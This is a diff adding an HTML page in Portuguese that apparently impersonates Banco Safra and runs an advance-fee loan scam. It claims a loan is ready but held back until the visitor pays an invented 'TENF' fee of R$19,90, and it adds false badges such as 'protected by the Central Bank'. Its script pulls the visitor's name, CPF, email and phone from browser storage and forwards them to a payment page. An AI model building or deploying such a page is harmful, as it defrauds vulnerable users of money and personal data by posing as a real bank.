@@ -1,0 +1,655 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script src="../../js/utm.js"></script>
+<script src="../../js/tracking.js"></script>
+
+<meta charset="utf-8">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TENF</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap');
+
+        :root {
+            --cred-primary: #020031;
+            --cred-light: #020031;
+            --cred-dark: #000634;
+            --cred-accent: #111827;
+            --btn-green: #020031;
+            --btn-green-hover: #FDAC17;
+            --border: #e5e7eb;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', Arial, Helvetica, sans-serif;
+            background-color: #F4F5F7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #111827;
+        }
+
+        .card,
+        .loading {
+            width: 100%;
+            overflow: hidden;
+        }
+
+        /* Topbar e header em verde Credfácil */
+        .topbar {
+            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-dark) 100%);
+            color: #fff;
+            padding: 1rem 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo-img {
+            height: 36px;
+            width: auto;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: .5rem;
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .user-avatar svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+        }
+
+        .icons {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .icons svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+            opacity: 0.9;
+        }
+
+        .user-name {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .main-header {
+            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-dark) 100%);
+            color: #fff;
+            padding: 0.5rem 1.5rem 2rem 1.5rem;
+        }
+
+        .indenizacao-info {
+            padding: 1.5rem;
+            text-align: start;
+            color: #000;
+            font-weight: bold;
+            background: white;
+            margin: -1.5rem 1rem 1rem 1rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(15, 0, 61, 0.1);
+        }
+
+        .indenizacao-info h2 {
+            font-size: 1rem;
+            margin-bottom: .5rem;
+            color: #374151;
+            font-weight: 600;
+        }
+
+        .indenizacao-info p {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--cred-primary);
+        }
+
+        .content {
+            padding: 0 1rem 1rem 1rem;
+        }
+
+        /* Alert em verde */
+        .alert {
+            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-primary) 100%);
+            color: #fff;
+            padding: 1rem;
+            font-weight: 500;
+            margin-bottom: 1rem;
+            border-radius: 12px;
+            font-size: .95rem;
+            box-shadow: 0 4px 15px rgba(15, 0, 61, 0.2);
+        }
+
+        .pendencia {
+            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
+            border: 1px solid #fde68a;
+            padding: 1.25rem;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+        }
+
+        .pendencia h3 {
+            font-size: 1rem;
+            margin-bottom: .75rem;
+            font-weight: 700;
+            color: var(--cred-accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .pendencia h3::before {
+            content: "";
+        }
+
+        .pendencia p {
+            font-size: .9rem;
+            line-height: 1.6;
+            color: #374151;
+        }
+
+        .pendencia p strong {
+            color: var(--cred-accent);
+        }
+
+        /* Botões VERDES */
+        .button,
+        .final-button {
+            width: 100%;
+            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-dark) 100%);
+            color: #fff;
+            border: none;
+            padding: 1rem;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all .3s ease;
+            box-shadow: 0 4px 15px rgba(2, 0, 49, 0.3);
+        }
+
+        .button:hover,
+        .final-button:hover {
+            filter: brightness(1.05);
+            box-shadow: 0 6px 20px rgba(2, 0, 49, 0.4);
+        }
+
+        .button:active,
+        .final-button:active {
+            transform: scale(0.98);
+        }
+
+        .loading {
+            display: none;
+            flex-direction: column;
+            align-items: flex-start;
+            justify-content: flex-start;
+            background-color: #fff;
+            padding: 1.5rem;
+            gap: 1rem;
+            flex: initial;
+            margin: 0 1rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(15, 0, 61, 0.1);
+        }
+
+        .loading.active {
+            display: flex;
+        }
+
+        .status-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--cred-primary);
+            opacity: 1;
+            transition: opacity .5s ease;
+        }
+
+        .status-text.fade-out {
+            opacity: 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            max-width: 400px;
+            height: 8px;
+            background-color: #e5e7eb;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--cred-light) 0%, var(--cred-primary) 100%);
+            transition: width .1s linear;
+            border-radius: 8px;
+        }
+
+        .final {
+            display: none;
+            flex-direction: column;
+            padding: 1.5rem;
+            gap: 1.5rem;
+            background-color: #fff;
+            margin: 0 1rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(15, 0, 61, 0.1);
+        }
+
+        .summary-card {
+            border: 2px solid var(--cred-primary);
+            border-radius: 12px;
+            padding: 1.25rem;
+            text-align: center;
+            background: linear-gradient(135deg, #f5f0ff 0%, #ffffff 100%);
+        }
+
+        .summary-card h2 {
+            font-size: .95rem;
+            color: #374151;
+            margin-bottom: .75rem;
+            font-weight: 600;
+        }
+
+        .summary-card p {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: var(--cred-primary);
+        }
+
+        .info-box {
+            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
+            border: 1px solid #fde68a;
+            border-radius: 12px;
+            padding: 1.25rem;
+            font-size: .9rem;
+            color: #374151;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .info-box b {
+            color: var(--cred-accent);
+        }
+
+        .value {
+            color: var(--cred-primary);
+        }
+
+        /* Security badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+            padding: 0.75rem;
+            background: #f9fafb;
+            border-radius: 8px;
+            font-size: 0.8rem;
+            color: #6b7280;
+        }
+
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+            color: #0B0A52;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: auto;
+            text-align: center;
+            padding: 1.5rem 1rem;
+            background: #F4F5F7;
+        }
+
+        .footer-logo {
+            height: 28px;
+            margin-bottom: 0.5rem;
+        }
+
+        .footer small {
+            font-size: 0.7rem;
+            color: #9ca3af;
+            line-height: 1.4;
+            display: block;
+        }
+
+        .content-initial {
+            margin-top: -1rem;
+        }
+    
+/* =================== FOOTER SAFRA =================== */
+.ss-footer{background:#fff;border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"DM Sans",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:28px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#F97316}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#020031}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"DM Sans",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#020031;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#fff;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#020031}
+
+</style>
+</head>
+
+<body>
+
+    <!-- CARD PRINCIPAL -->
+    <div class="card active" id="card">
+        <div class="topbar">
+            <div class="logo-container">
+                <div class="logo"><img src="../../images/logo.png?v=safra2" alt="Safra" style="height:28px;width:auto;"></div>
+            </div>
+            <div class="user-info">
+                <div class="user-avatar">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                    </svg>
+                </div>
+                <span class="user-name" id="user-name-top">Olá, Usuário</span>
+            </div>
+        </div>
+
+        <div class="main-header"></div>
+
+        <!-- LOADING -->
+        <div class="loading" id="loading">
+            <div class="progress-bar">
+                <div class="progress-bar-fill" id="bar"></div>
+            </div>
+            <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
+        </div>
+
+        <div class="content-initial">
+            <div class="indenizacao-info">
+                <h2><svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Empréstimo disponível</h2>
+                <p class="value" id="valor-exibido">R$ 0,00</p>
+            </div>
+
+            <div class="content">
+                <div class="alert" id="alert-nome"><svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:4px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>Atenção, <strong>Usuário</strong>. Leia a mensagem abaixo para liberar seu empréstimo.</div>
+
+                <div class="pendencia">
+                    <h3><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;color:#f59e0b"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>Pendência encontrada</h3>
+                    <p>
+                        Para você receber o seu valor, é obrigatório realizar o pagamento da <strong>TENF (Taxa de
+                            Emissão de Nota Fiscal)</strong> no valor de <strong>R$19,90</strong>.
+
+                        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. <br><br>
+                        Clique no botão abaixo para calcular sua taxa TENF.
+                    </p>
+                </div>
+
+                <button class="button" onclick="calcularFluxo()"><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>Calcular TAXA</button>
+                
+                <div class="security-badge">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                    </svg>
+                    Ambiente seguro e criptografado
+                </div>
+            </div>
+        </div>
+
+        <div class="final" id="final">
+            <div class="summary-card">
+                <h2><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>TENF (Taxa de Emissão de Nota Fiscal)</h2>
+                <p id="resumo-valor">Valor liberado: R$ 0,00</p>
+            </div>
+
+            <div class="info-box" id="info-extra">
+                <br>Para você receber o seu valor, é obrigatório realizar o pagamento da TENF (Taxa de Emissão de Nota
+                Fiscal).
+                O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento,
+                a transferência será feita para sua chave PIX cadastrada.
+                Caso não conclua o pagamento, seu empréstimo será bloqueado.
+            </div>
+
+            <button class="final-button" onclick="redirectEducacional()"><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>Efetuar o pagamento</button>
+            
+            <div class="security-badge">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                </svg>
+                Transação protegida pelo Banco Central
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+
+    <script>
+        /** Util pra JSON seguro */
+        function readJSON(key, fb = {}) {
+            try {
+                const raw = localStorage.getItem(key);
+                if (!raw) return fb;
+                const obj = JSON.parse(raw);
+                return (obj && typeof obj === "object") ? obj : fb;
+            } catch { return fb; }
+        }
+
+        /** Coleta de dados do localStorage com fallbacks */
+        const nameLS = (localStorage.getItem("nome") || localStorage.getItem("name") || "").trim();
+        const nomeUsu = (localStorage.getItem("nomeUsuario") || "").trim();
+        const dados = readJSON("dadosUsuario", {});
+        const nomeDoc = (dados.NOME || "").trim();
+
+        const docLS = (localStorage.getItem("cpf") || localStorage.getItem("document") || "").trim();
+        const cpfUsu = (localStorage.getItem("cpfUsuario") || "").trim();
+
+        const nomeFinal = nameLS || nomeUsu || nomeDoc || "Usuário";
+        const documento = docLS || cpfUsu || "";
+
+        const creditoRaw = (
+            localStorage.getItem("selectedLoanAmount") || 
+            localStorage.getItem("creditoSolicitado") || 
+            localStorage.getItem("valorEmprestimo") ||
+            ""
+        ).toString().trim();
+
+        function normalizeToNumber(v) {
+            if (typeof v === "number") return v;
+            if (!v) return 0;
+            let s = String(v).replace(/\s+/g, "");
+            if (/,/.test(s) && /\./.test(s)) s = s.replace(/\./g, "").replace(",", ".");
+            else if (/,/.test(s)) s = s.replace(",", ".");
+            s = s.replace(/[^\d.-]/g, "");
+            const n = Number(s);
+            return Number.isFinite(n) ? n : 0;
+        }
+        
+        function formatBRL(n) {
+            try { return n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }); }
+            catch { return "R$ " + (Math.round(n * 100) / 100).toFixed(2).replace(".", ","); }
+        }
+
+        const creditoNumber = normalizeToNumber(creditoRaw);
+        const valorFormatado = creditoNumber > 0 ? formatBRL(creditoNumber) : "R$ 0,00";
+
+        // Preenche UI
+        document.getElementById("user-name-top").innerHTML = `Olá, ${(nomeFinal.split(/\s+/)[0] || "Usuário")}`;
+        document.getElementById("valor-exibido").textContent = valorFormatado;
+        document.getElementById("alert-nome").innerHTML =
+            `<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:4px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>Atenção, <strong>${nomeFinal || "Usuário"}</strong>. Leia a mensagem abaixo para liberar seu empréstimo.`;
+
+        // Simulação de progresso
+        function calcularFluxo() {
+            document.querySelector(".content-initial").style.display = "none";
+            document.getElementById("loading").classList.add("active");
+
+            const bar = document.getElementById("bar");
+            const statusText = document.getElementById("status-text");
+            let progress = 0, trocado = false;
+
+            const it = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(it);
+                    document.getElementById("loading").classList.remove("active");
+                    document.getElementById("final").style.display = "flex";
+                    document.getElementById("resumo-valor").textContent = `Valor: ${valorFormatado}`;
+                    document.getElementById("info-extra").innerHTML =
+                        `<b>Nome:</b> ${nomeFinal || "-"} <br><b>CPF:</b> ${documento || "-"}<br><br>
+                        Para você receber o seu valor, é obrigatório realizar o pagamento da <b>TENF (Taxa de Emissão de Nota Fiscal)</b>. 
+                        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. 
+                        Após o pagamento, a transferência será feita para sua chave PIX cadastrada. 
+                        <br><br><b>Caso não conclua o pagamento, seu empréstimo será bloqueado.</b>`;
+                } else {
+                    progress++;
+                    bar.style.width = progress + "%";
+                    if (progress === 70 && !trocado) {
+                        trocado = true;
+                        statusText.classList.add("fade-out");
+                        setTimeout(() => {
+                            statusText.textContent = "Finalizando análise...";
+                            statusText.classList.remove("fade-out");
+                        }, 450);
+                    }
+                }
+            }, 30);
+        }
+        window.calcularFluxo = calcularFluxo;
+
+        // Redirect
+        function buildCheckoutParams() {
+            const g = (...ks) => { for (const k of ks) { try { const v = localStorage.getItem(k); if (v && v.trim()) return v.trim(); } catch (e) {} } return ""; };
+            // Preserva TODAS as UTMs/parâmetros já presentes na URL (utm_*, src, sck, fbclid, gclid, xcod, etc.)
+            const p = new URLSearchParams(window.location.search);
+            ["offer","pix_total","seguro_price","bump1","amount","cotacao_index"].forEach(function(k){ p.delete(k); });
+            const setIfMissing = (k, v) => { if (v && !p.get(k)) p.set(k, v); };
+            setIfMissing("name", g("name", "nome", "nomeUsuario"));
+            setIfMissing("email", g("email"));
+            setIfMissing("telephone", g("telephone", "telefone"));
+            setIfMissing("document", g("document", "cpf", "cpfUsuario"));
+            return p.toString();
+        }
+
+        function redirectEducacional() {
+            window.location.href = `../../pagamento/?offer=up2&${buildCheckoutParams()}`;
+        }
+        window.redirectEducacional = redirectEducacional;
+    </script>
+
+    <script src="js/ALPeCcr0lon8.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            initUpsell(2);
+        });
+    </script>
+
+<!-- FOOTER SAFRA -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="Safra"></div>
+  <p class="ss-footer-company">&copy; 2025 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Safra, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Safra é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Safra coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@safra.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>ParceiroChat</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 58.160.789/0001-28</p><p><strong>Razão Social:</strong> Banco Safra S.A.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll('.ss-dialog').forEach(function(d){d.addEventListener('click',function(e){if(e.target===d)d.close();});});
+</script>
+
+<script>if(/^(localhost|127\.0\.0\.1)$/.test(location.hostname)){var s=document.createElement("script");s.src="/dev-mode.js";document.body.appendChild(s);}</script>
+<script src="../../js/devnav.js"></script>
+</body></html>
